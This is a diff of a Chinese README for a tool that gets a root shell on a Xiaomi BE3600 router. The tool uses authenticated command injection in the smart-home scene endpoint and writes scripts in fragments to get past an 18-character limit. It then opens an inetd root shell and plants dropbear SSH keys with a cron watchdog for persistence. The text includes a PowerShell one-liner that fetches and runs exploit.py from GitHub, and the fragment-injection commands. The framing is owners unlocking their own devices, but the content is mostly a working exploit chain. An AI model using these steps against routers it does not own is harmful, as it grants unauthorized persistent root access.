@@ -24,15 +24,15 @@ POST api/xqsmarthome/request_smartcontroller
 scene_start ──► 注入命令以 root 执行（≤18 字符/条）
     │
     ▼
-碎片写入（echo -n F>/tmp/N + cat /tmp/?>x + sh x）
-    │   绕过 18 字符与禁用字符限制，写任意脚本文本
+追加式碎片写入（echo -n FF>>/tmp/x + cat /tmp/0>>/tmp/x）
+    │   每条注入命令 ≤18 字符，脚本长度不设上限
     ▼
 inetd.conf + /usr/sbin/inetd ──► :23 临时免密 root /bin/sh（调试用）
     │
     ▼
 /data + /etc/crontabs（sec_cfg）──► 看门狗每分钟自愈
 dropbear -s + authorized_keys ────► :22 SSH（仅密钥）
-persist 验证 :22 可达后 ──► 移除 inetd 与临时 shell
+persist 公钥登录验证通过后 ──► 移除 inetd 与临时 shell
 ```
 
 - **认证后 RCE**：需要 Web 管理密码换 `stok` token 才能到达注入接口，不是未授权 RCE
@@ -65,9 +65,11 @@ Windows PowerShell（`python` 不存在就把命令里的 `python` 换成 `py`�
 irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist --pubkey 'ssh-rsa AAAA...你的公钥'
 ```
 
-- `--stage persist` = 全自动：注入 → 临时 inetd（:23）→ 写入密钥 + dropbear（:22，`-s` 仅密钥）→ 验证 SSH 可达后移除 inetd → `/data` + cron 看门狗自愈
+- `--stage persist` = 全自动：注入 → 临时 inetd（:23）→ 写入密钥 + dropbear（:22，`-s` 仅密钥）→ **真实 SSH 登录验证通过**后移除 inetd → `/data` + cron 看门狗自愈
 - `--pubkey` **必填**：SSH 只做密钥认证，密码登录整路关闭（不再有 `-B` 空密码）
-- 追加 `--allow-cidr 192.168.31.0/24` 可让 persist 顺手加 iptables，把 :22 限到该网段
+- 追加 `--privkey 私钥路径` 用本机 `ssh` 做一次真实登录验证；不给则改为人工确认后才关 :23
+- 追加 `--allow-cidr 192.168.31.0/24` 走独立链 `RD16_SSH`（跳转规则置顶），把 :22 限到该网段
+- `--password` 不传会交互式询问，密码不进 shell 历史和进程列表
 - 只要临时调试 shell：`--stage persist` 换成 `--stage shell`，完成后 `nc 192.168.31.1 23`（重启即消失，不写持久配置）
 
 ## 快速复现（exploit.py）
@@ -85,19 +87,23 @@ python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage per
 
 exploit.py 只用标准库，完成登录→注入→inetd→(可选)持久化全过程。
 
-## 原理（碎片写入法）
+## 原理（追加式碎片写入）
 
-18 字符塞不下有用命令，把脚本拆成 ≤3 字符的碎片写进单字符文件再拼接：
+注入命令 ≤18 字符，脚本按 ≤2 字符碎片**直接追加**进目标文件，整条路径上不存在超过 18 字符的组装命令，因此脚本长度不设上限：
 
 ```sh
-echo -n nvr>/tmp/0     # 文件 /tmp/0 = "nvr"
-echo -n am >/tmp/1     # 参数间天然产生空格 -> 写入 "am "
-echo -n 2 >/tmp/2      # 数字结尾必须 ' >'，否则成 fd 重定向
-cat /tmp/?>/tmp/x      # 按 glob 序拼回完整脚本
+rm -f /tmp/x
+echo -n FF>>/tmp/x    # 非空格碎片（≤2 字符）直接追加
+echo -n A B>/tmp/0    # 含空格的三字符组 -> 临时文件
+cat /tmp/0>>/tmp/x    #   再追加（空格靠 argv 拆分产生）
+echo -n D >>/tmp/x    # 纯数字碎片要 ' >>'，否则 'D>>' 被当 fd 重定向
+echo A D >>/tmp/x     # 行尾碎片用普通 echo 顺带补换行
 sh /tmp/x
 ```
 
-文件名用 `0-9a-z`（36 个名额）；超出后 exploit.py 自动把每批拼进双字符累加文件（`/tmp/x0`、`/tmp/x1`…），最后统一组装——手工操作时可 `cat /tmp/?>/tmp/xx` 移到双字符名再继续。
+- 文件名不再受单字符名额限制：只有一个 `/tmp/0` 反复使用，一个输出文件承接全部内容
+- 行中出现的 `空格+数字`（`x 2` 形）无法合法写出，写入器会明确报错；`>` 这类重定向字符进不了脚本内容
+- `run_cmd()` 对每条注入命令做硬性长度与禁用字符检查，超长/越界直接拒绝而非静默失败
 
 ## 完整实现方式
 
@@ -156,20 +162,21 @@ tar -xzf sl.tar.gz -C sl && head sl/tmp/messages
 
 打包里还有 `stat/system-02-ps.txt`、`stat/hardware-01-bdata.txt`、`stat/firewall-01-iptable.txt` 等，直接看进程/nvram/iptables。
 
-### 4. 写长脚本（碎片法）
+### 4. 写长脚本（追加碎片法）
 
-18 字符内只能塞下 `echo -n F>/tmp/N` 形式的碎片，把脚本内容切片：
+18 字符内塞不下整段脚本，把内容切片**逐片追加**（每次注入一条）：
 
 ```sh
-rm -f /tmp/?                          # 清掉单字符文件
-echo -n nvr>/tmp/0; echo -n am >/tmp/1   # 每条一个 scene
-echo -n 2 >/tmp/2                        # 数字结尾必须 ' >'
-echo -n l/b>/tmp/3
-cat /tmp/?>/tmp/x                     # 按 glob 序拼回
-sh /tmp/x                             # 执行
+rm -f /tmp/x                            # 清空目标
+echo -n cp>>/tmp/x                      # ≤2 字符碎片直接追加
+echo -n A B>/tmp/0                      # 含空格的三字符组 -> 临时文件
+cat /tmp/0>>/tmp/x                      #   再追加（空格靠 argv 拆分产生）
+echo -n D >>/tmp/x                      # 纯数字碎片必须 ' >>'
+sh /tmp/x                               # 执行
 ```
 
-文件名用 `0-9a-z`（36 个名额），超出就 `cat /tmp/?>/tmp/xx` 移到双字符名再继续。
+空格碎片：`echo -n A B>/tmp/0`（文件得 `"A B"`，`A` 与 `B` 各一个非数字字符），随后 `cat /tmp/0>>/tmp/x`。
+全部注入命令都 ≤18 字符，脚本长度无上限。
 
 ### 5. 拿临时 shell：inetd（调试用）
 
@@ -189,8 +196,9 @@ inetd
 # /etc/dropbear/dropbear_rsa_host_key 是 0 字节占位文件，必须先删
 rm /etc/dropbear/dropbear_rsa_host_key
 dropbearkey -t rsa -f /data/dropbear_rsa_host_key     # ~1min，生成到 /data（持久）
+echo '你的 ssh-rsa 公钥' > /data/authorized_keys    # 先放 /data（重启不掉）
 mkdir -p /etc/dropbear
-echo '你的 ssh-rsa 公钥' > /etc/dropbear/authorized_keys
+cp /data/authorized_keys /etc/dropbear/authorized_keys
 /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key  # -s 禁用密码登录，仅密钥
 ```
 
@@ -214,19 +222,21 @@ pgrep -x dropbear >/dev/null 2>&1 || \
 * * * * * sh /data/persist.sh >/dev/null 2>&1
 ```
 
-收尾两步：
+收尾：先用真实私钥确认能登录（`ssh -i 私钥 root@<ip> id` 返回 `uid=0`），**确认通过后**再关掉调试 shell——只看 :22 监听或 banner 不算数：
 
 ```sh
-# 确认 :22 已监听（netstat -lnt），然后关掉调试 shell
 for p in $(pgrep -x inetd); do kill $p; done
 rm -f /etc/inetd.conf
 ```
 
-可选：把 SSH 限到管理网段（写进 persist.sh 一起自愈）：
+可选：把 SSH 限到管理网段（独立链 + 置顶跳转，规则顺序不受既有 ACCEPT 影响；写进 persist.sh 一起自愈）：
 
 ```sh
-iptables -I INPUT -p tcp -s 192.168.31.0/24 --dport 22 -j ACCEPT
-iptables -A INPUT -p tcp --dport 22 -j DROP
+iptables -N RD16_SSH 2>/dev/null
+iptables -F RD16_SSH
+iptables -A RD16_SSH -s 192.168.31.0/24 -j ACCEPT
+iptables -A RD16_SSH -j DROP
+iptables -I INPUT -p tcp --dport 22 -j RD16_SSH
 ```
 
 重启后 ~1 分钟 dropbear 自动恢复，而 inetd 不会回来。
@@ -234,6 +244,7 @@ iptables -A INPUT -p tcp --dport 22 -j DROP
 ## 涉及文件
 
 - `exploit.py` — 单文件工具（stdlib only），完成登录→注入→inetd→(可选)持久化
+- `tests/test_exploit.py` — 离线单元测试（stdlib only），碎片写入回放、长度/禁用字符、输入校验
 - `docs/TECHNICAL.md` — 注入点源码定位、限制推导、备选通道（中文）
 - `docs/TECHNICAL_EN.md` — 上述技术细节的英文版
 - `README.en.md` — 英文版说明
